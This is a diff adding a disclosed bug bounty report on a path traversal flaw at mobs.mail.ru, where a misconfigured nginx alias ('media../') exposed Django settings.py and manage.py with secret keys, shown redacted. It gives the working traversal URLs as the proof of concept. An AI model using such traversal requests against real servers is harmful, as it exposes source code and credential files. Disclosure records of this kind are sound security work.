@@ -1,0 +1,44 @@
+ReportLink:https://hackerone.com/reports/312510
+WeaknessName:Information Disclosure
+Reporter:https://hackerone.com/bobrov
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:22.05.2018 15:09:32
+
+Summary:
+
+Domain, site, application
+--
+mobs.mail.ru
+
+Steps to reproduce
+--
+```
+http://mobs.mail.ru/media../mobs/settings.py
+```
+
+Actual results
+--
+```py
+...
+SECRET_KEY = '████████████'
+...
+DISTIMO_PRIVATE_KEY = '████████████'
+...
+```
+
+PoC, exploit code, screenshots, video, references, additional resources
+--
+```
+http://mobs.mail.ru/media../mobs/settings.py
+http://mobs.mail.ru/media../manage.py
+```
+
+[alias_traversal] Path traversal via misconfigured alias
+https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md
+
+## Impact
+
+Source code and configuration disclosure
